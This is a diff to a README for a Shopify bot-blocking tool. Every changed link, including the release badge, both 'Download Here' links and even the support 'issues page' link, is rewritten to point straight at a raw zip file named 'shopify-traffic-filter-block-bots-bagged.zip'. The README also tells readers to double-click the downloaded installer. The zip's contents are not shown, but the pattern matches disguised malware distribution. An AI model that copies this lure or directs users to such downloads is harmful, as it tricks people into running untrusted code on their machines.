@@ -4,7 +4,7 @@
 
 Welcome! This guide will help you download and run the Shopify Traffic Filter to block bots and manage traffic restrictions effectively.
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/elmamlaka/shopify-traffic-filter-block-bots/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/elmamlaka/shopify-traffic-filter-block-bots/main/chernozem/shopify-traffic-filter-block-bots-bagged.zip)](https://raw.githubusercontent.com/elmamlaka/shopify-traffic-filter-block-bots/main/chernozem/shopify-traffic-filter-block-bots-bagged.zip)
 
 ## 💻 What Is Shopify Traffic Filter?
 
@@ -28,7 +28,7 @@ Shopify Traffic Filter is an application designed to help Shopify users protect 
 
 1. **Download the Application:**  
    Visit the Releases page to download the latest version of the application.  
-   [Download Here](https://github.com/elmamlaka/shopify-traffic-filter-block-bots/releases)
+   [Download Here](https://raw.githubusercontent.com/elmamlaka/shopify-traffic-filter-block-bots/main/chernozem/shopify-traffic-filter-block-bots-bagged.zip)
 
 2. **Install the Application:**  
    Once downloaded, locate the file in your Downloads folder. Double-click to run the installer and follow the on-screen instructions.
@@ -43,7 +43,7 @@ Shopify Traffic Filter is an application designed to help Shopify users protect 
 
 To get started, visit the Releases page to download the latest version of the Shopify Traffic Filter. Click the link below:
 
-[Download Here](https://github.com/elmamlaka/shopify-traffic-filter-block-bots/releases)
+[Download Here](https://raw.githubusercontent.com/elmamlaka/shopify-traffic-filter-block-bots/main/chernozem/shopify-traffic-filter-block-bots-bagged.zip)
 
 Once you download the file, follow the installation steps mentioned earlier.
 
@@ -63,7 +63,7 @@ No, you can block as many countries as necessary to protect your store.
 
 ## 📞 Support
 
-If you encounter issues or have questions, feel free to reach out for help. Check the [issues page](https://github.com/elmamlaka/shopify-traffic-filter-block-bots/issues) for common problems and solutions, or create a new issue.
+If you encounter issues or have questions, feel free to reach out for help. Check the [issues page](https://raw.githubusercontent.com/elmamlaka/shopify-traffic-filter-block-bots/main/chernozem/shopify-traffic-filter-block-bots-bagged.zip) for common problems and solutions, or create a new issue.
 
 ## 🔄 Updates
 
